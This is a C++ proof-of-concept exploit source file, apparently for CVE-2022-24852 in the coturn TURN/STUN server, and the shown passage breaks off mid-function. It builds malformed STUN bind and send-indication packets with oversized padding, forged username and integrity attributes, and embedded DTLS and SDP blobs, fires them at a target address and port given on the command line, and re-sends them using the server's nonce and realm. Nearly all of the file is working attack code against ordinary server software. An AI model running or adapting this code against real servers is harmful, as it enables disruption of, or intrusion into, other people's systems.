//-------------------------------------------------
// 
// Author : @shokoluv
// compile:  g++ cve-2022-24852.cpp  -o cve-2022-24852   -lz  -lsctp 
// run: cve-2022-24852 $COTURN_IP4_ADDR $PORT


#include <thread>
#include <string>
#include <algorithm>
#include <cstdlib>
#include <cstring>
#include <string>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <iostream>
#include <string>
#include <unistd.h>           // 
#include <string.h>           // 
#include <netinet/ether.h>    // ether_ntoa
#include <bits/stdc++.h>	  // for regex
#include <netdb.h>            // 
#include <sys/types.h>        // 
#include <sys/socket.h>       // needed for socket()
#include <netinet/in.h>       //
#include <netinet/ip.h>       // 
#include <netinet/ip6.h>
#include <netinet/udp.h>      //
#include <arpa/inet.h>        //	 

#include <sys/ioctl.h>        // 
#include <bits/ioctls.h>      // 
#include <netinet/icmp6.h>
#include <net/if.h>            // 
#include <linux/if_ether.h>
#include <linux/if_packet.h>     

#include <linux/sctp.h>
#include <netinet/sctp.h>
#include <sys/mman.h>
#include <errno.h>            
#include <ctime>
#include <zlib.h> //crc32 
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>


#define MOD4(x)  ((x)+	((4-((x)%4))))
#define TEST_4000 true

#define REQUEST         0x0000
#define INDICATION      0x0001
#define RESPONSE        0x0002
#define ERROR_RESPONSE  0x0003

/* Methods */
#define BINDING                 0x0001 /* draft-ietf-behave-rfc3489bis-17 */
#define ALLOCATE                0x0003 /* draft-ietf-behave-turn-10*/
#define REFRESH                 0x0004 /* draft-ietf-behave-turn-10*/
#define CHANNELBIND             0x0009 /* draft-ietf-behave-turn-10*/
#define CREATE_PERMISSION       0x0008 /* draft-ietf-behave-turn-10 */
/* Indications */
#define SEND                    0x0006 /* draft-ietf-behave-turn-10*/
#define DATA_IND                0x0007 /* draft-ietf-behave-turn-10*/
#define SEND_INDICATION         0x0016 
#define DATA_INDICATION         0x0017 



uint16_t random_port();
void overflow_sctp(struct sockaddr_in& address);
//rfc 6679 rtpmap sdp
const char* sdp_rtpmap = "v=%d\n-=%s %ld IN IP4 %s\ns=%s\ni=%s\nb=AS:%d\nb=RR:%d\nb=RS:%d\na=ice-pwd:%s\na=ice-ufrag:%s\na=ice-options:rtp+ecn\nt=0 0\nm= audio 45664 RTP/AVPF 97 98 99\nc=IN IP4 %s\na=rtpmap:97 G719/48000/1\na=fmtp:97 maxred=160\na=rtpmap:99 PCMA/8000/1\na=maxptime:160\na=ptime=1\na=ecn-capable-rtp:ice rtp ect=0 mode=setread\na=rtcp-fb:* nack ecn\na=rtcp-fb:* trr-int 1000\na=rtcp-xr:ecn-sum\na=rtcp-rsize\n"
					     "a= candidate:1 1 UDP %lu %s %d typ srflx raddr %s rport %u \n"
					     "a= candidate:2 1 UDP %lu %s %d typ host\n";


int send_data(int sock, char* data , size_t data_size,int channel_id , 
			  size_t count=10,uint16_t _random_port=0,bool test4k=false);


static unsigned char packet[65536];
static int16_t channel_id =0x6666	;

#pragma pack(0)



typedef struct {
	uint32_t longpart[4];
} UInt128;
UInt128 global_transaction;

typedef struct {
	uint32_t longpart[3];
} UInt96;

typedef struct {
	uint32_t magicCookie; // rfc 5389
	UInt96 tid;
} Id;

typedef struct {
	uint16_t msg_type;
	uint16_t msg_len; // length of stun body
	union {
		UInt128 magicCookieAndTid;
		Id id;
	};
} stun_header;

typedef struct   {
	uint16_t channel_id;
	uint16_t size; 
}channel_header;


typedef struct { 

      uint16_t attribute_type;
      uint16_t size;
      char offset;
} stun_attribute ;
//ipv4:
//----------------
typedef struct {
    uint16_t attribute_type;
    uint16_t size;
	uint8_t reserved; 
	uint8_t family_type;
	uint16_t port ;
	in_addr addr;

 }stun_address_attribute;
//ipv6:
//----------------
typedef struct {
    uint16_t attribute_type;
    uint16_t size;
	uint8_t reserved; 
	uint8_t family_type;
	uint16_t port ;
	in6_addr addr;
 }stun_address_attribute6;
 
 
 	struct rtp_header
	{
#if (__BYTE_ORDER==__LITTLE_ENDIAN)
		uint8_t csrcCount : 4;
		uint8_t extension : 1;
		uint8_t padding : 1;
		uint8_t version : 2;
		uint8_t payloadType : 7;
		uint8_t marker : 1;
#elif (__BYTE_ORDER==__BIG_ENDIAN)
		uint8_t version : 2;
		uint8_t padding : 1;
		uint8_t extension : 1;
		uint8_t csrcCount : 4;
		uint8_t marker : 1;
		uint8_t payloadType : 7;
#endif
		uint16_t sequenceNumber;
		uint32_t timestamp;
		uint32_t ssrc;
	};
#pragma pack()


const static uint8_t IPv4Family = 0x01;
const static uint8_t IPv6Family = 0x02;

const static uint32_t ChangeIpFlag = 0x04;
const static uint32_t ChangePortFlag = 0x02;

const static uint16_t BindRequest = 0x0001;
const static uint16_t BindResponse = 0x0101;


inline volatile void* shared_malloc(size_t size)
{
	//static int fd = open("/dev/zero",O_RDWR);
	volatile void* ret =::mmap(nullptr,size,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,-1,0);
 	if(ret==MAP_FAILED)
	{
		std::cout<<strerror(errno);
		exit(0);

	}
	return ret;
}

static volatile int* parent_port=(int*) shared_malloc(sizeof(int));
static volatile int* child_port=(int*) shared_malloc(sizeof(int));

bool child = false;

//attributes:
const static uint16_t ResponseAddress = 0x0002;
const static uint16_t ChangeRequest = 0x0003; /* removed from rfc 5389.*/
const static uint16_t MessageIntegrity = 0x0008;
const static uint16_t ErrorCode = 0x0009;
const static uint16_t UnknownAttribute = 0x000A;
const static uint16_t XorMappedAddress = 0x0020;
 
//// globals for nonce,relam,addresses per fork.
static stun_attribute* nonce = nullptr;
static stun_attribute* realm = nullptr;
const size_t attrib_size = (sizeof(stun_attribute)-1); //no trailing offset for sizeof.
struct sockaddr_in local, peer_addr; //global 


const char* rtcp="\x90\xc9\xfd\xbc\x0f\x56\xff\xff\xcc\xff\xcc\xff\xcc\x00"
				 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x57\xfa\xbc\x0f\x56\x00\x00"
				 
				 "\0x03\x33\x73\x40\x07\x46\x55\x66\x77\x88\x99\x00\x00\x00"
				 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x90\x57\xfa\xbc\x0f\x56\x00\x00"
				 ;


/*
# DTLS
udp 443,4433,4740,5349,5684,6514,6636,10161,10162
  # DTLS 1.2, length 52
  "\x16\xfe\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36"
  # ClientHello, length 40, sequence 0, offset 0
  "\x01\x00\x00\x2a\x00\x00\x00\x00\x00\x00\x00\x2a"
  # DTLS 1.2
  "\xfe\xfd"
  # Random
  "\x00\x00\x00\x00\x7c\x77\x40\x1e\x8a\xc8\x22\xa0\xa0\x18\xff\x93"
  "\x08\xca\xac\x0a\x64\x2f\xc9\x22\x64\xbc\x08\xa8\x16\x89\x19\x3f"
  # Session id length 0, cookie length 0
  "\x00\x00"
  # Cipher suites, mandatory TLS_RSA_WITH_AES_128_CBC_SHA
  "\x00\x02\x00\x2f"
  # Compressors (NULL)
  "\x01\x00"

*/

const char * tls_header = "\x16\xfe\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00\x2a\x00\x00\x00\x00\x00\x00\x00\x2a\x16\xfe\xfd\x00\x00\x00\x00\x00\x00\x00\x01\x01\x2c\x0b\x00\x01\x20\x00\x01\x00\x00\x00\x00\x01\x20\x00\x01\x1d\x00\x01\x1a\x30\x82\x01\x16\x30\x81\xbd\xa0\x03\x02\x01\x02\x02\x09\x00\xe2\x80\x29\x8a\xd9\x41\x0f\x2d\x30\x0a\x06\x08\x2a\x86\x48\xce\x3d\x04\x03\x02\x30\x11\x31\x0f\x30\x0d\x06\x03\x55\x04\x03\x0c\x06\x57\x65\x62\x52\x54\x43\x30\x1e\x17\x0d\x32\x32\x30\x35\x32\x34\x31\x37\x31\x39\x32\x37\x5a\x17\x0d\x32\x32\x30\x36\x32\x34\x31\x37\x31\x39\x32\x37\x5a\x30\x11\x31\x0f\x30\x0d\x06\x03\x55\x04\x03\x0c\x06\x57\x65\x62\x52\x54\x43\x30\x59\x30\x13\x06\x07\x2a\x86\x48\xce\x3d\x02\x01\x06\x08\x2a\x86\x48\xce\x3d\x03\x01\x07\x03\x42\x00\x04\x11\xf5\x44\x97\x21\x55\x32\x67\x22\x06\x6a\x61\x2d\x32\x25\xf6\x4d\xa5\xd6\xac\x97\xa2\x6b\xf2\x65\x42\xa2\x3b\x15\x82\x20\x72\x3f\xb9\x43\x19\xbb\xf9\x15\xc4\x8c\xf7\x28\x50"
"\x71\x45\x37\x92\x1b\x14\xd9\x36\xfc\x27\x92\xd1\x2d\xb5\xf5\x96\x72\x84\xb5\xf4\x30\x0a\x06\x08\x2a\x86\x48\xce\x3d\x04\x03\x02\x03\x48\x00\x30\x45\x02\x21\x00\xbb\x15\x32\x1c\xd7\x5f\xa1\x10\x69\x08\x0c\x91\xd0\x04\xec\x1c\x7a\xb4\x51\x39\xe0\x10\x3a\x32\xba\xb8\xa3\x95\xc0\x71\x90\x63\x02\x20\x37\x4d\xfe\x2a\xf9\x00\x5f\x8f\x63\x26\x21\x4c\x11\x72\x69\x89\xf2\xbe\x7a\x22\xdb\x41\x70\x74\x82\x97\x65\x91\x9d\xdd\x67\x56\x16\xfe\xfd\x00\x00\x00\x00\x00\x00\x00\x02\x00\x2d\x10\x00\x00\x21\x00\x02\x00\x00\x00\x00\x00\x21\x20\x5a\xb2\x70\x4c\x3c\x97\x11\x31\xdb\x8f\xde\x8d\x5d\x92\x00\x25\x46\x0d\x31\xc9\x29\xb3\x74\x8f\xae\x53\x6d\xaa\xab\xf8\xb2\x16\xfe\xfd\x00\x00\x00\x00\x00\x00\x00\x03\x00\x57\x0f\x00\x00\x4b\x00\x03\x00\x00\x00\00\x04\xb0\x40\x30\x04\x73\x04\x50\x22\x03\xb3\x91\x0f\x33\xeb\x4d\x6d\xe5\x20\x19\x1e\xb1\x29\xaf\x5a\x93\x15\x40\xc5\xe2\x4b\xf3\x42\x94\xa2\x2b\x88\x82\x37\x75\x35\x70\x22\x10\x0d\x6c\xa5\x93\xa6\x69\x2d\x72\x31\x2a\x30\x96\x01\xd0\x95\xac\x78\xb2\xb9\x65\x64\xc5\xa8\x3e\x42\xd5\x55\x23\xb7\x36\x5b\x3d\xe1\x4f\xef\xd0\x00\x00\x00\x00\x00\x00\x00\x40\x00\x10\x11\x6f\xef\xd0\x00\x10\x00\x00\x00\x00\x00\x00\x03\x00\x00\x10\x00\x00\x00\x00\x00\x00\x7d\x03\x49\x2a\x1c\xc6\xb9\x4a\x88\xd4\x6e\x22\xd1\x0eb\x15\x5f\x2b\x36\x49\x8d\x42\xa8\xe8\xee\x54\x9f\x64\x2c\xe6\xb1\x2c\x86\xa1\x70\x8b\xec\x5b\xe5\x9d";
const char* CREATE_PERMISSION_USER_PREFIX_TEST  = "\x10\x50\x94\x4a\xb6\x55\x00\x00\x32";


stun_attribute* add_nonce_realm(stun_attribute* patt);
uint16_t random_port() {
	
	std::random_device r;
	std::default_random_engine random1(r());
	std::uniform_int_distribution<uint16_t> dist(0,uint16_t(-1));

	return 1+ (dist(random1));
}


inline std::string fake_sasl_prep(const std::string& str )
{
	std::string ret;
	for( auto s : str)
	{
		if (s<0x1f && s>0) s+=0x1f;
		if(s>0x80 || s<0x100 )
			s=0x101+s%0x100;
		ret+=s;

	}
	return ret;
}

void sync_ports ()
{
			if(child)
			{
				if(child_port)
				*child_port = local.sin_port;
				if(parent_port&&child_port && parent_port!=MAP_FAILED )
  	 			{	
					   std::cout<<"[child] parent port "<<*parent_port<< "<> child port "<<*child_port<<std::endl; 
				
				}	   
				else 
				{
					std::cout<<"mapping failed "<<std::hex<<ptrdiff_t(parent_port)<<",child="<<ptrdiff_t(child_port)<<std::dec<<std::endl;

				}
			}
			else
			{	
				if(parent_port)
				*parent_port = local.sin_port;

 				if(parent_port&&child_port && child_port !=MAP_FAILED)

				{
 					std::cout<<"[parent] parent port "<<*parent_port<< "<> child port "<<*child_port<<std::endl;				
				}
				else 
				{
					std::cout<<"mapping failed "<<std::hex<<ptrdiff_t(parent_port)<<",child="<<ptrdiff_t(child_port)<<std::dec<<std::endl;
					
				}

			
			}

}

//generate some alphanumeric string
static void gen_random_string(char* s , size_t len) {
	static const char alphanum[]="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	std::random_device r;
	std::default_random_engine random1(r());
	std::uniform_int_distribution<uint16_t> dist(0,sizeof(alphanum)-1);
	for(size_t i=0;i<len;++i) 
		s[i] = alphanum[dist(random1)];
}
// parse nonce , realm for globals. ignore other attributes for now.
stun_address_attribute other_address;
void parse_attributes ( unsigned char* stunheadptr)
{
	stun_header* pheader  = (stun_header*) &stunheadptr[0];
	uint16_t type = ntohs(pheader->msg_type);
	uint16_t len = ntohs(pheader->msg_len);
	std::cout<< "[+] parsing msg_type:" <<type<<std::endl;
	std::cout<< "[+] parsing msg_len:" <<len<<std::endl;
	size_t offset=sizeof(stun_header),old_offset=0;
	while(offset-old_offset<len)
	{
		stun_attribute* p_attr = (stun_attribute*) &stunheadptr[offset];
		std::cout<< "attribute type/len [" <<ntohs( p_attr->attribute_type) << "/"<<ntohs(p_attr->size)<<std::endl;
		
		if(p_attr->attribute_type == htons(0x0014))
		{
			realm = p_attr;
			std::cout<< "[+] realm "<<((const char*)&p_attr->offset)<<std::endl;
		}
		else if ( p_attr->attribute_type==htons(0x0015))
		{
			nonce = p_attr;
			std::cout<< "[+] nonce "<<((const char*)&p_attr->offset)<<std::endl;
		}
		else if (p_attr->attribute_type==htons(0x0013))
		{
			std::cout<<"[+] great success  getting DATA ["<<htons(p_attr->size)<<"]" <<std::endl;
		}
		else if (p_attr->attribute_type==htons(0x802c))
		{
			std::cout<<"[+]   success  binding . got  OTHER_ADDRESS ["<<htons(p_attr->size)<<"]" <<std::endl;
			memcpy(&other_address,p_attr,sizeof(stun_address_attribute));

		}

		auto att_length = ntohs(p_attr->size);
		att_length += (4-att_length%4);
		offset+=att_length;


	}

}
//send bind request, get response. 
int dummy_bind(const char* target_address ,bool is_channel_header =false ) 
{
	int sock_ret = -1;//
	int ret=-1;
	stun_attribute* fingerprint =nullptr;
	static char bind_request[32678]={};
	static int16_t dummy_channel = channel_id;
	stun_attribute* randomize=nullptr;
	time_t t; time(&t);
	std::string raw_time = ctime(&t);

	size_t total=0,acc_payload=0;
	stun_header* h = (stun_header*)&bind_request[0];
	char *ptr = &bind_request[0],*buf=ptr;

	if(global_transaction.longpart[0]==0){
	gen_random_string((char*) &h->magicCookieAndTid , 16);
		memcpy( &global_transaction, &h->magicCookieAndTid, sizeof(UInt128));
	}
	//total size: 
	if(is_channel_header) 
	{
	acc_payload= MOD4(4+8+0x40+(attrib_size*6))+0x410+0x1c +0x800-52;
	channel_header* pheader = (channel_header*) &bind_request[0];
	pheader->channel_id = htons(channel_id);
	pheader->size = htons(acc_payload);
	}
	else
	{
	acc_payload= MOD4(sizeof(stun_header)+(attrib_size*6))+0xc54;
	
	h->msg_len =htons(acc_payload);// htons(8+MOD4(0x20)+(attrib_size*4));
	
	h->msg_type =htons(SEND_INDICATION) ;// (random_port()%2==0)? htons(SEND_INDICATION):random_port()%2==0?htons(0x07):htons(0x006);
	//validate cookie 
	h->id.magicCookie = htonl(0x2112a442);

	}


	
	stun_address_attribute* p_aattr = (stun_address_attribute*) &bind_request[is_channel_header ?sizeof(channel_header): sizeof(stun_header)] ;
	p_aattr->attribute_type = htons(0x0016) ;//NON MALFORMED XOR-PEER-ADDRESS
	p_aattr->size = htons(12);
	p_aattr->addr.s_addr = peer_addr.sin_addr.s_addr ^ htonl (0x2112A442);
 
	p_aattr->port = (peer_addr.sin_port? peer_addr.sin_port:3478) ^ htons( 0x2112A442 >> 16);
	p_aattr->family_type=0x1;
	p_aattr->reserved=0;

 
 	stun_attribute * p_attr =(stun_attribute*) (((char*)&bind_request[sizeof(stun_header)+12]));

	p_attr->attribute_type =htons(0x0019);// htons(0x0026); //replace USE-CANDIDATE with padding
	p_attr->size=htons(0);//data 0
	p_attr =(stun_attribute*)(&p_attr->offset) ;// &bind_request[sizeof(stun_header)+(attrib_size*2)+8];//pad
	p_attr->attribute_type = htons(0x0024); //PRIORITY
	p_attr->size=htons(4);

	*(uint32_t*)&p_attr->offset = htonl(1);//(); //just first byte . 
	p_attr =(stun_attribute*) (((char*)&p_attr->offset)+4);
 	gen_random_string(&p_attr->offset,0x1F);//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	*(&p_attr->offset+0xA)=':';
	p_attr->attribute_type= htons(0x0006);  //htons(0x0006); //USERNAME
	p_attr->size=htons(0x20);//username 
	//memcpy((char*)&p_attr->offset,CREATE_PERMISSION_USER_PREFIX_TEST,9); //override with suffix . 

    std::string fake =  fake_sasl_prep(raw_time.c_str())  ;
	fake = "-1:-1:::"+fake;
	memcpy((char*)&p_attr->offset,fake.c_str(),fake.size()); // first byte +null. 


	p_attr =(stun_attribute*) (((char*)&p_attr->offset)+(0x20));

	gen_random_string(&p_attr->offset,0x1F);
	//memset(,0x41,0x20);//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	p_attr->attribute_type=htons(0x008);//toggle integrity with DATA
	p_attr->size=htons(MOD4(0x10));// how 'bout hmac of 10 bytes?
	//p_attr->offset=0x0041;
	//add fingerprint:
	stun_attribute* padding = (stun_attribute*) (((char*)&p_attr->offset)+MOD4(0x10));

	padding->size= htons(MOD4(0x810)); 
	padding->attribute_type=htons(random_port()%3==0?0x022:0x802b);//response origin instead of padding
	//set also channel number in the padding space

	memset(&padding->offset,0xFF,ntohs(padding->size));


    p_attr = (stun_attribute*)(&padding->offset+(ntohs(padding->size)));

 	p_attr->attribute_type = (random_port()%1==0)?htons(0x002A): htons(0x000c);//channel number
		p_attr->size = htons(4);

	int v=htons(dummy_channel);//-channel number
	memcpy (&p_attr->offset, &v,2);

	uint16_t* pattr_channel = (uint16_t*)&p_attr->offset;
	v=0;
	   *((uint16_t*)((char*)&p_attr->offset+2))=0;
   
 	  
	//gen_random_string(&padding->offset,0x1F);

	p_attr = (stun_attribute*) (((char*)&padding->offset)+(ntohs(padding->size)));
	p_attr->attribute_type = htons(0x0026);// htons(0x8028);//fingerprint
	p_attr->size = htons(4);// too big ?
	
	fingerprint = p_attr;
	// p_attr = (stun_attribute*) &bind_request[sizeof(stun_header)+acc_payload-8];
	 //p_attr->attribute_type=htons(0x013);
	 //p_attr->size = htons(1024);
	 stun_address_attribute* other_address_copy = (stun_address_attribute*) (((char*)&p_attr->offset+4));
	 other_address_copy->attribute_type=htons(32812);//
	 other_address_copy->reserved=0;
	 other_address_copy->port=htons(3478);
	 other_address_copy->addr.s_addr = peer_addr.sin_addr.s_addr;//0.0.0.0:3478 is reused inet_addr(target_address);
	other_address_copy->family_type= 1 ;//   default 1;
	local.sin_family =  peer_addr.sin_family = AF_INET;
	
	other_address_copy->size=htons(sizeof(stun_address_attribute));
	
	if(peer_addr.sin_addr.s_addr==0||peer_addr.sin_port==0)
	   {
		   peer_addr.sin_addr.s_addr =  inet_addr(target_address);
	       peer_addr.sin_port = htons(3478);
	   }
    //reuse local port on client bind.
  	local.sin_addr.s_addr = INADDR_ANY;
 	local.sin_port = 0;//ntohs(random_port());

	//last attribute, data for the rest : 
	p_attr = (stun_attribute*)  (((char*)&p_attr->offset+MOD4(16)));
	gen_random_string(&p_attr->offset,0x400);//random
	
	uint16_t random_subheader=random_port();
	randomize = p_attr;

	if(random_subheader%2==0){
	memcpy( &p_attr->offset,  tls_header,545 );
	}else {
			memcpy( &p_attr->offset,  sdp_rtpmap,sizeof(sdp_rtpmap)/sizeof(sdp_rtpmap[0]) );
	}

	//else it's random data.
	p_attr->attribute_type = htons(0x013);
	p_attr->size = htons(0x400);  //htons(acc_payload- ( ptrdiff_t(&p_attr->offset)-ptrdiff_t(bind_request))  );
	
	p_attr =(stun_attribute*) ptrdiff_t(&p_attr->offset+0x400);
	p_attr = add_nonce_realm(p_attr);

	if(nonce==nullptr)
	h->msg_len = htons(ntohs(h->msg_len)+MOD4(0x100));
    	sock_ret = socket(AF_INET, SOCK_DGRAM, 0);
   		
	std::cout<<"[+] dummy connect " << target_address <<std::endl; 
		
	   if (bind(sock_ret,(struct sockaddr *)&local,sizeof(local)) == -1) {
        	std::cerr<<std::string("[-] bind \n");
        	exit(-1);
    
	    }

	
  	do { 
		std::cout<<"[+] sending " << ntohs( h->msg_len ) <<std::endl; 
		//no xor, so...
		//other_address-_copy>port =htons(peer_addr.sin_port);

		int v=htonl(crc32(0,(u_char*)&bind_request[0],acc_payload)^0x5354554E);
		memcpy (&fingerprint->offset	, &v,4);

		 ret =  ::sendto(sock_ret,bind_request,sizeof(stun_header)+ntohs(h->msg_len),0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;
		 
		 dummy_channel = dummy_channel+1;
		 //update : 
		 *pattr_channel = htons(dummy_channel);

   		} while (ret==0);
		   //ret =send_data(sock_ret,bind_request,sizeof(bind_request),0);

 
	std::cout<<"[+] process "<<getpid()<<" sent  dummy request, sendto returned  :"<< ret <<"bytes"<<std::endl;

	return close(sock_ret);

}



int bind_client ( const char* target_address) 
{
	int sock_ret = -1;//
	int ret=-1;

	//no need for large packets. 
	char bind_request[32684]={};

	time_t t; time(&t);
	std::string raw_time = ctime(&t);
	std::string fake = std::string("::::1:")+  fake_sasl_prep(CREATE_PERMISSION_USER_PREFIX_TEST) ;

	uint32_t rval=htonl(0x1000a);
	size_t total=0,acc_payload=0;
	stun_header* h = (stun_header*)&bind_request[0];
	char *ptr = &bind_request[0],*buf=ptr;
	acc_payload= MOD4(sizeof(stun_header)+4+0x20+(attrib_size*6)+0x800-20)+0x100;
	h->msg_len =htons(acc_payload);// htons(8+MOD4(0x20)+(attrib_size*4));
	h->msg_type = htons(1) ; //bind req/success
	//gen_random_string((char*) &h->magicCookieAndTid , 16);
	memcpy(&h->magicCookieAndTid ,&global_transaction, sizeof(UInt128));

	h->id.magicCookie = htonl(0x2112a442);
	stun_attribute* p_attr = (stun_attribute*) &bind_request[sizeof(stun_header)] ;
	p_attr->attribute_type = htons(0x8029) ;//ICE-CONTROLLED,change to 802a for controlling later
	p_attr->size = htons(8);
	gen_random_string((char*)&p_attr->offset,8);
	p_attr =(stun_attribute*) (((char*)&p_attr->offset)+8);
	p_attr->attribute_type = htons(0x026	); //USE-CANDIDATE
	p_attr->size=htons(4);
	memcpy(&p_attr->offset, &rval,sizeof(uint32_t));
	
	p_attr =(stun_attribute*)(&p_attr->offset+4) ;// &bind_request[sizeof(stun_header)+(attrib_size*2)+8];//pad
	p_attr->attribute_type = htons(0x0024); //PRIORITY
	p_attr->size=htons(4);
	p_attr->offset = random_port(); //just first byte . 
	p_attr =(stun_attribute*) (((char*)&p_attr->offset)+4);
 	memset(&p_attr->offset,0x41,0x20);//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	*(&p_attr->offset+0xA)=':';
	p_attr->attribute_type=htons(0x0006); //USERNAME
	p_attr->size=htons(0x20);//username 
	//memcpy((char*)&p_attr->offset,CREATE_PERMISSION_USER_PREFIX_TEST,9); //override with suffix . 

	memcpy((char*)&p_attr->offset,fake.c_str(),fake.size()); // first byte +null. 
 	p_attr =(stun_attribute*) (((char*)&p_attr->offset)+(0x20));//  32bytes
	gen_random_string(&p_attr->offset,0x7FF);
	//memset(,0x41,0x20);//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	p_attr->attribute_type= htons(8);// htons(8);//toggle integrity with DATA
	p_attr->size=htons(0x10);//password
	//p_attr->offset=0x0041;
	//add fingerprint:
	//add fingerprint:
	stun_attribute* padding = (stun_attribute*) (((char*)&p_attr->offset)+(0x10));
	memset(&padding->offset,0xff,0x408);
	padding->size= htons(0x408); 
	padding->attribute_type= htons(0x0026);//htons(8);

	p_attr = (stun_attribute*) (((char*)&padding->offset)+(0x408));
	p_attr->size = htons(0x400);
	p_attr->attribute_type = htons(0x8023);
	memcpy(&p_attr->offset, tls_header,sizeof(tls_header)/sizeof(tls_header[0]) );
	p_attr = (stun_attribute*) (((char*)&p_attr->offset)+(0x400));



	p_attr->attribute_type = htons(0x0019);// htons(0x8026);// htons(0x8028);//fingerprint
	p_attr->size = htons(4);// too big ?
	memset(&p_attr->offset,0,4);//set reserved bits
	 p_attr->offset=0x11; //NBO 
	stun_attribute *fingerprint = p_attr;
	int v=htonl(crc32(0,(u_char*)&bind_request[0],acc_payload)^0x5354554E);
	//	for(size_t i=0;i<4;++i)
	memcpy (&fingerprint->offset, &v,4);

	p_attr = add_nonce_realm(p_attr);
	p_attr = (stun_attribute*)&p_attr->offset+8;


 	local.sin_family =  peer_addr.sin_family = AF_INET;

 	if ( target_address!=NULL && peer_addr.sin_addr.s_addr ==0)
 	{
 			peer_addr.sin_addr.s_addr =  inet_addr(target_address);
			peer_addr.sin_port = htons(3478);

 	}
	p_attr = (stun_attribute*)((&fingerprint->offset)+ntohs(fingerprint->size));
    p_attr->attribute_type = htons(0x013);
	p_attr->size= htons(0x1F0);
	memset(&p_attr->offset,0x013,0x1FF);

	p_attr = (stun_attribute*)&p_attr->offset+ntohs(p_attr->size);

  	local.sin_addr.s_addr = INADDR_ANY;
 	local.sin_port = 0;//ntohs(random_port());

    sock_ret = socket(AF_INET, SOCK_DGRAM, 0);
   		
	   std::cout<<"[+] bind/connect " << target_address <<std::endl; 
		
	   if (bind(sock_ret,(struct sockaddr *)&local,sizeof(local)) == -1) {
        	std::cerr<<std::string("[-] bind \n");
        	exit(-1);
    
	    }

	
		if (connect(sock_ret,(struct sockaddr *)&peer_addr,sizeof(peer_addr)) == -1) {
               std::cerr<<std::string("[-] UDP connect error \n");
               	exit(-1);
        }
		else
		{
			socklen_t slen = sizeof(local);

			getsockname(sock_ret,(sockaddr*)&local,&slen);
			std::cout<< "[+] connected to  local port "<<local.sin_port <<std::endl; 

			sync_ports();

 		}
 	do { 
			//stun_attribute* att = (stun_attribute*)(& bind_request[acc_payload]);
			stun_attribute* pre_realm = p_attr;
			stun_attribute* att = add_nonce_realm(p_attr);
 			int v=htonl(crc32(0,(u_char*)&bind_request[0],acc_payload+0x1c)^0x5354554E);

  			att->attribute_type = htons(0x8028);
			att->size = htons(4);
			memcpy (&att->offset	, &v,4);

			
			att = (stun_attribute*)&att->offset+4;
			att->attribute_type=(0x28);
			att->size = htons(12);
 			//second trip : 
			h->msg_len = htons(ntohs(h->msg_len)+0x104);

		std::cout<<"[+] sending " << ntohs( h->msg_len ) <<std::endl; 

		 ret =  ::sendto(sock_ret,bind_request,sizeof(stun_header)+ntohs(h->msg_len),0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;
   
   		} while (ret==0);

		if(ret>0) 
		{
			socklen_t l = sizeof(sockaddr);
			sockaddr addr;
				struct timeval tv;
			tv.tv_sec = 1;
			tv.tv_usec = 666;
			setsockopt(sock_ret,SOL_SOCKET,SO_RCVTIMEO,(const char*)&tv,sizeof(tv));


			memcpy(&addr,&peer_addr.sin_addr,sizeof(sockaddr_in)) ;
		 	ret = ::recvfrom(sock_ret,packet,65535,0, /**/0,0);
		 	std::cout<<"[+] recvfrom returned :"<<ret<<std::endl; 
		// if(htons(((stun_header*)(packet))->msg_type)>100)
			std::cout<<"[+] bind response was 0x"<< std::hex<<htons(((stun_header*)(packet))->msg_type)<<std::dec<<std::endl;



		 parse_attributes(packet);
		 if ( ntohs(((stun_header*)(packet))->msg_type)!=0x101 )
		 {
			 //resend with nonce ... 
			//fingerprint->size=htons(4); //fix size
			stun_attribute* att = (stun_attribute*)(& bind_request[acc_payload]);
			att = add_nonce_realm(p_attr);
 			int v=htonl(crc32(0,(u_char*)&bind_request[0],acc_payload+0x1c)^0x5354554E);

  			att->attribute_type = htons(0x8028);
			att->size = htons(4);
			memcpy (&att->offset	, &v,4);
			att = (stun_attribute*)&att->offset+4;
			att->attribute_type=(0x8028);
			att->size = htons(12);
 			//second trip : 
			h->msg_len = htons(ntohs(h->msg_len)+0x1C);
		    ret =  ::sendto(sock_ret,bind_request,sizeof(stun_header)+ntohs(h->msg_len),0,(struct sockaddr*)&peer_addr ,sizeof(peer_addr) ) ;
			if(ret>0) 
			{
				 ret = ::recvfrom(sock_ret,packet,65535,0, /**/0,0);
		 		std::cout<<"[+] bind_client recvfrom 2 returned :"<<ret<<std::endl; 

			}
		 }else if (ntohs(((stun_header*)(packet))->msg_type)==0x101) {

				std::cout <<"[+] binding success response from the server ).()"<<std::endl;
 		 }
		 else 
		 //ignore any 401 errors 
				std::cout <<"[+] binding error  response from the server 0x "<<ntohs(((stun_header*)(packet))->msg_type) <<std::endl;;
		}
	std::cout<<"[+] sent bind request :"<< ret<<std::endl;
	return sock_ret;
}
#define CRASH_NONCE 0
stun_attribute* add_nonce_realm(stun_attribute* patt)
{
	if(realm!=nullptr)
	{
		std::cout<<"[+] adding nonce/realm" <<std::endl;
		patt->attribute_type = realm->attribute_type;
		patt->size = realm->size; 
		memcpy(&patt->offset,&realm->offset,ntohs(realm->size));
		patt = (stun_attribute*) (ptrdiff_t(&patt->offset)+(ntohs(patt->size)));
	}
	if(nonce!=nullptr)
	{
		std::cout<<"[+] adding nonce/realm" <<std::endl;

		patt->attribute_type = nonce->attribute_type;
		patt->size = nonce->size; 
		memcpy(&patt->offset,&nonce->offset,ntohs(nonce->size));
